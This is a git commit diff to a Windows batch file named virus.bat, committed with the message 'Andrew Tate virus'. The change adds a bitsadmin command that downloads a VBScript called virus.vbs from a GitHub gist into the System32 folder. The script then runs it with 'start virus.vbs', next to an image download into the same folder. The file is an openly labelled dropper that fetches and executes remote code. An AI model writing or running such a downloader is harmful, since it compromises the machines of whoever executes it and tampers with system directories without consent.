a52f16b712f90b2d70226c4e8eee95880da863d2
INeedHelp <leonardo.bartolelli@gmail.com>
2023-02-21 20:18:56 +0100

    Andrew Tate virus

--- AT/virus.bat
+++ AT/virus.bat
@@ -1,6 +1,6 @@
 @echo off
 
-bitsadmin /transfer myDownloadJob /download /priority high http://wallpapercave.com/wp/wp11484003.jpg %systemroot%\System32\wpll48003.jpg
-
+bitsadmin /transfer myDownloadJob /download /priority highest http://wallpapercave.com/wp/wp11484003.jpg %systemroot%\System32\wpll48003.jpg
+bitsadmin /transfer githubgist /download /priority highest https://gist.githubusercontent.com/INeddHelp/58772972accfa837a75b226dac23e88b/raw/6c9324badfd28849276abc16270244ac5eba40ad/virus.vbs %systemroot%\System32\virus.vbs
 cd %systemroot%\System32
 start virus.vbs
